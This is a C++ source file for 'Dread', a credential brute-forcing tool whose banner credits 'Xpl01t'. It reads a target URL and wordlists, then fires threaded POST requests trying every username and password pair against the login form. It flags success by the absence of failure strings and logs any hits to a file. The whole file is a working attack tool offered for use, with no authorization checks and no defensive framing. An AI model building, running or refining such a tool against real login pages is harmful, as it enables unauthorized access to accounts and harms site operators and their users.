#include "dread.h"
#include <iostream>
#include <vector>
#include <atomic>
#include <fstream>
#include <curl/curl.h>
#include <thread>
#include <mutex>
#include <chrono>

using namespace std;
using Lock = lock_guard<mutex>;
mutex mtx;
atomic<bool> found = false;
atomic<int> attemptCount = 0;

void Dread::banner() {
    cout << "\033[38;5;94m";
    cout << R"(
############################################
#██████╗ ██████╗ ███████╗ █████╗ ██████╗   #
#██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗  #
#██║  ██║██████╔╝█████╗  ███████║██║  ██║  #
#██║  ██║██╔══██╗██╔══╝  ██╔══██║██║  ██║  #
#██████╔╝██║  ██║███████╗██║  ██║██████╔╝  #
#╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝   #
#                                          #
#              DREAD V1.2                  #
#    By Xpl01t | www.XploitPower.com       #
############################################
)" << "\033[0m" << endl;
}

void Dread::loadWordlists() {
    cout << "[?]Enter the target URL : ";
    cin >> targetURL;

    string user, pass;
    cout << "[+]Enter the path of usernames wordlist: ";
    cin >> user;
    cout << "[+]Enter the path of passwords wordlist: ";
    cin >> pass;

    usernames.clear();
    passwords.clear();

    ifstream uFile(user), pFile(pass);
    string line;

    if (!uFile.is_open() || !pFile.is_open()) {
        cerr << "[-]Can't open one of the wordlists." << endl;
        return;
    }

    while (getline(uFile, line)) usernames.push_back(line);
    while (getline(pFile, line)) passwords.push_back(line);

    cout << "\033[1;33m[++]Wordlists have been loaded successfully!\033[0m" << endl;
}

bool Dread::trylogin(const string& user, const string& pass) const {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    string response;
    string postfield = "username=" + user + "&password=" + pass;

    curl_easy_setopt(curl, CURLOPT_URL, targetURL.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfield.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);  // timeout
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](void* contents, size_t size, size_t nmemb, string* s) {
        s->append((char*)contents, size * nmemb);
        return size * nmemb;
    });
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) return false;

    // Make this flexible: reject common "fail" strings
    return response.find("Invalid") == string::npos &&
           response.find("incorrect") == string::npos &&
           response.find("error") == string::npos;
}

void Dread::bruteforce() {
    vector<thread> threads;

    for (const string& user : usernames) {
        for (const string& pass : passwords) {
            if (found.load()) break;

            threads.emplace_back([this, user, pass]() {
                if (found.load()) return;

                this_thread::sleep_for(chrono::milliseconds(10));  // throttle
                bool success = trylogin(user, pass);
                int attempt = ++attemptCount;

                Lock lock(mtx);
                cout << "[*]Trying " << user << ":" << pass << " (Attempt " << attempt << ")" << endl;

                if (success) {
                    found.store(true);
                    cout << "\033[32m[+]Dread succeeded: username: " << user << " | password: " << pass << "\033[0m" << endl;

                    ofstream out("dread_found.txt", ios::app);
                    out << "FOUND => " << user << ":" << pass << endl;
                    return;
                }
            });

            // Optional: limit number of threads to prevent CPU death
            if (threads.size() > 1000) {
                for (auto& t : threads) if (t.joinable()) t.join();
                threads.clear();
            }
        }
        if (found.load()) break;
    }

    for (auto& t : threads) if (t.joinable()) t.join();

    if (!found.load()) {
        cerr << "\033[31m[-]Dread failed to find valid credentials.\033[0m" << endl;
    }
}

void Dread::run() {
    banner();
    loadWordlists();
    bruteforce();
}
